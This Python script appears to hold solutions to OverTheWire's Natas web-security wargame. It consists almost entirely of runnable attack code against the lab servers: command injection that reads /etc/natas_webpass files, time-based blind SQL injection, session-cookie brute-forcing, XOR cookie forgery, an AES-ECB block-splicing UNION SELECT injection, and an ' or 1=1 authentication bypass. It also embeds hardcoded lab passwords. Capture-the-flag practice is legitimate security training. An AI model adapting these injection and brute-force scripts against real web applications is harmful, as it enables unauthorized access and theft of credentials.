import base64
import binascii
from tools import cryptotools


def level11():
    key = b"\x71\x77\x38\x4a"
    base = b'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'

    unbase = base64.b64decode(base)
    unxored = bytearray()

    i = 0
    for x in unbase:
        mutation = key[i % len(key)]
        unxored.append(x ^ mutation)
        i += 1

    print("Decoding...")

    message = unxored.decode("utf-8")
    print("Message: " + message)
    new_message = message.replace('"no"', '"yes"')
    print("New message: " + new_message)

    new_unxored = bytearray(new_message.encode("utf-8"))
    new_xored = bytearray()

    i = 0
    for x in new_unxored:
        mutation = key[i % len(key)]
        new_xored.append(x ^ mutation)
        i += 1
    print("Re-encoding")
    print(base64.b64encode(new_xored).decode("utf-8"))

    return True


def level16():
    import requests
    from requests.auth import HTTPBasicAuth

    credentials = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
    searchstring = 'doomed'
    payload = {'needle': searchstring}

    allchars = "abcdefghijklmnoqprstuvwxyzABCDEFGHIJKLMNOQPRSTUVWXYZ0123456789"
    usedchars = ''

    password = ''
    direction = 'pre'
    found = 0

    for char in allchars:
        payload['needle'] = searchstring + '$(grep ' + char + ' /etc/natas_webpass/natas17)'
        r = requests.get('http://natas17.natas.labs.overthewire.org/index.php?develop=1', params=payload,
                         auth=credentials)
        if not r.text.__contains__(searchstring):
            usedchars += char

    while len(password) < 32:
        for char in usedchars:
            found = 0
            if direction == 'pre':
                tmp = char + password
            else:
                tmp = password + char
            payload['needle'] = searchstring + '$(grep ' + tmp + ' /etc/natas_webpass/natas17)'
            r = requests.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload, auth=credentials)
            if not r.text.__contains__(searchstring):
                found += 1
                password = tmp
                print("Direction: " + direction + "     , current pw: " + password)
                break
        if found == 0:
            if direction == 'pre':
                direction = 'post'
            else:
                direction = 'pre'

    print("Found password: " + password)
    return True


def level17():
    import requests
    from requests.auth import HTTPBasicAuth
    import time

    credentials = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
    searchstring = 'doomed'
    payload = {'username': searchstring}

    allchars = "abcdefghijklmnoqprstuvwxyzABCDEFGHIJKLMNOQPRSTUVWXYZ0123456789"

    password = ''
    found = 0
    i = 0

    # TODO We can improve this code by detecting first all used chars in password, then loop through this chars only.
    while len(password) < 32:
        for char in allchars:
            found = 0
            payload['username'] = 'natas18" AND password COLLATE latin1_bin like "' \
                                  + password + char + '%" and SLEEP(5) #'

            start = time.perf_counter()
            r = requests.get('http://natas17.natas.labs.overthewire.org/index.php?debug=1', params=payload,
                             auth=credentials)
            end = time.perf_counter()

            if end - start > 4:
                password += char
                found += 1
                print("i: " + str(i) + "       found pw: " + password)
                time.sleep(5)
                break
        if found == 0:
            print('NOTHING FOUND FOR ' + password)
        i += 1

    print("Found password: " + password)
    return True


def level18():
    import requests
    from requests.auth import HTTPBasicAuth

    credentials = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

    for i in range(0, 641):
        cookie = {"PHPSESSID": str(i)}
        r = requests.get('http://natas18.natas.labs.overthewire.org/index.php', cookies=cookie, auth=credentials)
        if r.text.__contains__("You are logged in as a regular user"):
            print("false: " + cookie.get("PHPSESSID"))
        else:
            print("SUCCESS PHPSESSID = " + cookie.get("PHPSESSID"))
            print(r.text)
            break
    return True


def level19():
    import requests
    from requests.auth import HTTPBasicAuth

    credentials = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

    for i in range(1, 1000):
        identifier = ''
        for symbol in str(i):
            identifier += format(ord(symbol), "x")
        cookie = {"PHPSESSID": identifier + "2d61646d696e"}
        print(identifier)
        r = requests.get('http://natas19.natas.labs.overthewire.org/index.php', cookies=cookie, auth=credentials)
        if r.text.__contains__("You are logged in as a regular user"):
            print("false: " + cookie.get("PHPSESSID"))
        else:
            print("SUCCESS PHPSESSID = " + cookie.get("PHPSESSID"))
            print(r.text)
            break
    return True


def level28():
    # If you are bored of computing everything every time sy AIE!
    bored = False
    crypt = cryptotools.CryptoTools(encrypted=base64.b64decode('G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmk'
                                                               'ZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvj'
                                                               '3zYcY5Nhmsez6dCXsRGup36O0aq+C10FxP/mrBQjq0eOsaH+JhosbB'
                                                               'UGEQmz/to='))
    i = 8
    while i in range(8, 257):
        if cryptotools.aes.detect_aes_128_ecb(crypt.get_encrypted(), i):
            print("Block size : " + str(i))
            print([binascii.hexlify(crypt.get_encrypted()[j * i:j * i + i]) for j in range(0, int(len(crypt.get_encrypted())/i))])
        i *= 2

    key_for_xor = cryptotools.bytes_xor(bytearray.fromhex('f633e6b05f866226b863817112b1c92b'), b'\x41')
    print("The key is: " + str(key_for_xor))

    for i in range(0, len(crypt.get_encrypted()), 16):
        print(cryptotools.bytes_xor(crypt.get_encrypted()[i: i+16], key_for_xor))
    # This is not just a multibyte xor encryption time for some serious play

    import requests
    from requests.auth import HTTPBasicAuth
    import urllib.parse

    # detect placement of our data inside a ciphertext
    credentials = HTTPBasicAuth('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')
    previous_array = b''
    bytes_to_pad = -1
    for i in range(0, 48):
        if bored:
            break
        parameters = {"query": 'A'*i}
        r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
        location = r.history[0].headers['Location']
        if location[:18] == 'search.php/?query=':
            encrypted = binascii.hexlify(base64.b64decode(urllib.parse.unquote(location[18:])))
            if cryptotools.compare_bytearrays(previous_array, bytearray(encrypted[2*32:3*32])) and bytes_to_pad == -1:
                bytes_to_pad = i-1
            print('par_size: ' + str(len(parameters['query'])) + '  encrypted blocks: ' + str(len(encrypted)/(16 * 2)) +
                  '   Par_content: ' + str(binascii.hexlify(bytearray(parameters['query'].encode('ascii')))))
            print([encrypted[i:i + (16 * 2)] for i in range(0, len(encrypted), (16 * 2))])
            previous_array = bytearray(encrypted[2*32:3*32])
        else:
            print("Wrong response - cannot parse location header.")
    # detect which characters are escaped
    escaped_chars = ''
    for i in range(32, 127):
        if bored:
            break
        parameters = {"query": chr(i) * 12}
        r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
        location = r.history[0].headers['Location']
        if location[:18] == 'search.php/?query=':
            encrypted = binascii.hexlify(base64.b64decode(urllib.parse.unquote(location[18:])))
            print(
                'par_size: ' + str(len(parameters['query'])) + '  encrypted blocks: ' + str(len(encrypted) / (16 * 2)) +
                '   Par_content: ' + str(binascii.hexlify(bytearray(parameters['query'].encode('ascii')))))
            print([encrypted[i:i + (16 * 2)] for i in range(0, len(encrypted), (16 * 2))])
            if len(encrypted) / (16 * 2) > 5:
                escaped_chars += chr(i)
        else:
            print("Wrong response - cannot parse location header.")
    if bored:
        bytes_to_pad = 10

    print("Bytes to pad before text: " + str(bytes_to_pad))
    print('Chars that are escaped: ' + escaped_chars)

    # Get 3 first block containing 1* A in query
    parameters = {"query": 'A' * 10}
    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
    location = r.history[0].headers['Location']
    nice_begin_blocks = ''
    if location[:18] == 'search.php/?query=':
        encrypted = base64.b64decode(urllib.parse.unquote(location[18:]))
        nice_begin_blocks = encrypted[:16*3]

    # Now generate block with unescaped ' and union statement
    statement = (' ' * (bytes_to_pad-1)) + "' UNION SELECT password FROM users #"
    parameters = {"query": statement}
    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
    location = r.history[0].headers['Location']
    nice_blocks = ''
    if location[:18] == 'search.php/?query=':
        encrypted = base64.b64decode(urllib.parse.unquote(location[18:]))
        nice_blocks = encrypted[16*3:]
    else:
        print("Wrong response - cannot parse location header.")

    payload = base64.b64encode(nice_begin_blocks + nice_blocks)
    payload = str(payload)[2:-1]
    # consider URL encoding here (most browsers don't rly need it anyway - and it's not a bug it's a feature)
    print("Heavy payload here: " + payload)

    return True


def level30():
    import requests
    from requests.auth import HTTPBasicAuth

    credentials = HTTPBasicAuth('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')

    parameters = {"username": "natas31", "password": ["'' or 1=1", 3]}
    r = requests.post("http://natas30.natas.labs.overthewire.org/index.pl", data=parameters, auth=credentials)

    print(r.text)


def main():
    levels = ('11', '16', '17', '18', '19', '28', '30')

    print("Hi there!\n"
          "you've just run natas (http://overthewire.org/wargames/natas/) levels solutions. Not every level\n"
          "require a python solution, so this app will not help you with all of them. Anyway enjoy our stay.\n")

    print("Available levels solutions: " + str(levels).strip(' ()').replace("'", ""))
    level = input("Pick level to solve: ")
    level = level.lower().strip()

    if level == 'q':
        return 0

    if level in levels:
        if level == '11':
            level11()
        if level == '16':
            level16()
        if level == '17':
            level17()
        if level == '18':
            level18()
        if level == '19':
            level19()
        if level == '28':
            level28()
        if level == '30':
            level30()
    else:
        print("Hey! There is no such level. Bye bye!")


if __name__ == '__main__':
    main()